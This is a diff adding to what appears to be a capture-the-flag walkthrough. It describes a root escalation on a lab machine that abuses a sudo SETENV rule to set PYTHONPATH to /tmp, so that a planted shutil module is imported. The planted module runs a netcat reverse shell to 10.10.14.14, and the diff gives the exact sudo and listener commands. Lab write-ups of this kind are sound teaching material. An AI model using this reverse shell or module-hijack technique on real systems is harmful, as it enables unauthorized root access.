@@ -237,3 +237,23 @@ import os, socket, subprocess
 def make_archive(a , b, c):
 os.system("nc -c bash 10.10.14.14 9001")
 ```
+It allows us to save the script in /tmp<br>
+
+We have to change the path of python variable because were only allowed to use sudo admin_tasks.sh but our script is in /tmp.  We are changing the sudo env variable path to match that of admin_tasks.sh that way its equal to our script shuttil.py which is located in /tmp this way we can get a root shell with the privileges that admin_tasks has, which is root. The `sudo -l` told us that we have permission to change this variable. <em><strong>(ALL) SETENV: /opt/scripts/admin_tasks.sh</em></strong><br>
+
+`sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh`<br>
+
+We get the System Administration Menu which is what we saw in the admin_tasks.sh script at the bottom. We use the option 6 to back up web data because that is the one that says "src =/var/www/html" web data" so it can call our script instead and give us a root shell.<br>
+
+before you do this open up another terminal and start a nc listener. `nc -lvnp 9001`<br>
+
+![PYTHONPATH](https://user-images.githubusercontent.com/110210595/189812293-bdd0c941-546b-44c4-a07f-c74db73fa141.png)
+
+It executed so I go to the other terminal with the listener starting and we got root.
+
+![proof_of_root](https://user-images.githubusercontent.com/110210595/189812379-a14fac9a-39a0-4d00-b0ac-c3d66535f251.PNG)
+
+
+https://user-images.githubusercontent.com/110210595/189812401-85a2775c-a808-4f29-8f1d-5de5f49b7965.MOV
+
+![root_flag](https://user-images.githubusercontent.com/110210595/189812446-228fb6a8-ba32-4ab2-8cd8-875d938e3ce4.PNG)
